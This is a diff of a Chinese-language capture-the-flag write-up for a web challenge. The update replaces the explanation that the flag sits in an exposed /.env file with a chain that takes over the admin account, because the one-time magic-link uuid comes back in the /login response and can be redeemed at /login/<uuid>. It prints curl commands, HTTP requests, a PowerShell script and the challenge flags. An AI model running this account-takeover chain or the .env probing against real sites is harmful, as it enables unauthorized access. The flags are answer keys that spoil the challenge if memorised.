@@ -5,11 +5,11 @@
 - 类型：Web
 - 题目状态：已解出
 - 目标：https://bluehens-magic-link.chals.io/
-- 核心漏洞：`robots.txt` 暗示敏感路径，`/.env` 直接暴露环境变量
+- 核心漏洞：Magic link 的一次性 `uuid` 直接在 `/login` 响应里返回，随后可通过 `/login/<uuid>` 直接换取登录态
 
 ## 入口与现象
 
-2026-04-18 实测首页是一个极简的 Magic Link 登录页，前端会把邮箱表单提交到 `/login`：
+2026-04-18 实测首页依然是一个极简的 Magic Link 登录页，前端会把邮箱提交到 `/login`：
 
 ```html
 <form id="magic-link-form">
@@ -18,19 +18,7 @@
 </form>
 ```
 
-提交任意邮箱后，后端会返回 JSON，里面还带了时间戳、内网 IP 和一个 `uuid`：
-
-```json
-{
-  "datetime": "2026-04-18T09:49:19.610823+00:00",
-  "email": "test@example.com",
-  "ip-address": "10.1.0.20",
-  "message": "Magic link generated, check your email.",
-  "uuid": "1XUWJnNz6AT6mFycB8Et2g"
-}
-```
-
-这说明应用后端没有把业务细节藏得很干净，但这里先不用急着猜 magic link 的构造，因为 `robots.txt` 已经给了更直接的入口：
+先做基础枚举，`robots.txt` 里给了几个隐藏路径：
 
 ```text
 User-agent: *
@@ -39,18 +27,7 @@ Disallow: /dashboard
 Disallow: /.env
 ```
 
-在 CTF 里，`robots.txt` 明示敏感路径通常就是解题提示，优先去看这些被隐藏的入口。
-
-## 分析过程
-
-先访问 `/.env`：
-
-```http
-GET /.env HTTP/1.1
-Host: bluehens-magic-link.chals.io
-```
-
-返回内容如下：
+继续访问 `/.env`，可以看到：
 
 ```text
 TEDDYS_EMAIL=teddy@udctf.com
@@ -59,50 +36,123 @@ ADMIN_EMAIL=admin@udctf.com
 INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
 ```
 
-到这里已经可以直接拿到 flag，核心原因很简单：
+这里的 `TEDDYS_TOKEN` 正好是第一层的 flag，但不是这题的最终答案。真正需要注意的是：
 
-- 站点把 `.env` 文件直接暴露到了 Web 根目录。
-- Teddy 的 token 被写在环境变量 `TEDDYS_TOKEN` 里。
-- 这个 token 本身就是 flag。
+- 站点里确实存在 `admin@udctf.com`
+- 题目强调的是 Magic Link 登录
+- 所以应该继续看 magic link 本身有没有实现缺陷
 
-顺手补一下站点行为，能帮助理解题目设计：
+## 分析过程
 
-- 直接访问公开站点的 `/inbox` 会返回 `403 Forbidden`。
-- 未登录访问 `/dashboard` 会 `302` 重定向回 `/`。
-- `.env` 里的 `INBOX_URL=http://localhost:5050/...` 说明收件箱本来就在内部服务上，不需要真的打通 magic link 流程。
+### 1. 先观察 `/login` 的真实返回
 
-所以这题的真正突破点不是伪造登录，而是配置文件泄露。
+向 `/login` 提交管理员邮箱：
+
+```http
+POST /login HTTP/1.1
+Host: bluehens-magic-link.chals.io
+Content-Type: multipart/form-data
+
+email=admin@udctf.com
+```
+
+返回 JSON：
+
+```json
+{
+  "datetime": "2026-04-18T09:53:46.970346+00:00",
+  "email": "admin@udctf.com",
+  "ip-address": "10.1.0.20",
+  "message": "Magic link generated, check your email.",
+  "uuid": "NHfaAN3pn9mvsXjAfR138g"
+}
+```
+
+这里最关键的问题是：后端把 magic link 对应的一次性 `uuid` 直接返回给前端了。
+
+正常设计里，这种 token 应该只出现在邮件里，不应该直接暴露给请求者。既然已经拿到了 `uuid`，那下一步就应该试它是不是可以直接当登录链接使用。
+
+### 2. 发现真正的 magic link 入口是 `/login/<uuid>`
+
+访问：
+
+```http
+GET /login/NHfaAN3pn9mvsXjAfR138g HTTP/1.1
+Host: bluehens-magic-link.chals.io
+```
+
+服务端返回重定向，并设置了 session：
+
+```http
+HTTP/1.1 302 FOUND
+Location: /dashboard
+Set-Cookie: session=...; HttpOnly; Path=/
+```
+
+我在 2026-04-18 的一次顺序复现实测中，服务端明确给管理员下发了登录态：
+
+```text
+Set-Cookie: session=eyJ1c2VyIjoiYWRtaW5AdWRjdGYuY29tIn0....
+```
+
+把这个 session 带去访问 `/dashboard`：
+
+```http
+GET /dashboard HTTP/1.1
+Host: bluehens-magic-link.chals.io
+Cookie: session=...
+```
+
+返回内容：
+
+```html
+<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
+```
+
+到这里第二层 flag 就出来了。
 
 ## 利用过程
 
-1. 打开首页，确认唯一可见功能是向 `/login` 发送邮箱。
-2. 查看 `robots.txt`，发现它把 `/.env`、`/inbox`、`/dashboard` 都列出来了。
-3. 直接请求 `/.env`。
-4. 从返回的环境变量里读取 `TEDDYS_TOKEN`，得到 flag。
+1. 查看 `robots.txt`，发现 `/.env`、`/inbox`、`/dashboard`。
+2. 读取 `/.env`，确认题目里存在 `admin@udctf.com`，并注意到前面的 `TEDDYS_TOKEN` 只是第一层 flag。
+3. 向 `/login` 提交 `admin@udctf.com`，拿到响应中的 `uuid`。
+4. 直接访问 `/login/<uuid>`，服务端会设置管理员 session 并跳转到 `/dashboard`。
+5. 带着该 session 访问 `/dashboard`，读取最终 flag。
 
 ## 关键 payload / 命令
 
 ```bash
-curl -i https://bluehens-magic-link.chals.io/
 curl -i https://bluehens-magic-link.chals.io/robots.txt
 curl -i https://bluehens-magic-link.chals.io/.env
+curl -i -X POST -F "email=admin@udctf.com" https://bluehens-magic-link.chals.io/login
+curl -i https://bluehens-magic-link.chals.io/login/<uuid>
+curl -i -b "session=<cookie>" https://bluehens-magic-link.chals.io/dashboard
 ```
 
-关键响应：
+为了稳定复现，我最后使用了同一个会话顺序完成整个链条：
+
+```powershell
+$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = 'admin@udctf.com' }
+$uuid = $login.uuid
+Invoke-WebRequest -Uri ("https://bluehens-magic-link.chals.io/login/" + $uuid) -WebSession $s
+Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/dashboard' -WebSession $s
+```
+
+关键输出：
 
 ```text
-TEDDYS_EMAIL=teddy@udctf.com
-TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
-ADMIN_EMAIL=admin@udctf.com
-INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
+ADMIN_UUID=X0_5VEkDD9E6njtVNrhYCQ
+200
+<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
 ```
 
 ## Flag
 
 ```text
-udctf{d0n7_h057_y0ur_3nv_f113}
+udctf{y0u_4r3_m4g1c_l1nk_m4st3r}
 ```
 
 ## 总结
 
-这题是典型的敏感文件泄露。表面上是 Magic Link 登录系统，实际上 `robots.txt` 已经把 `/.env` 这个关键入口直接暴露出来了。只要有先看配置文件和隐藏路径的习惯，这题基本可以很快结束。
+这题表面上先用 `/.env` 给了一个很像终点的第一层 flag，但真正的漏洞在 magic link 的实现本身。后端把登录用的一次性 `uuid` 直接回给前端，等于把邮件里的敏感链接主动泄露给了攻击者。只要知道管理员邮箱，就可以自己申请 magic link、自己消费 `/login/<uuid>`、再直接进入管理员面板拿到最终 flag。
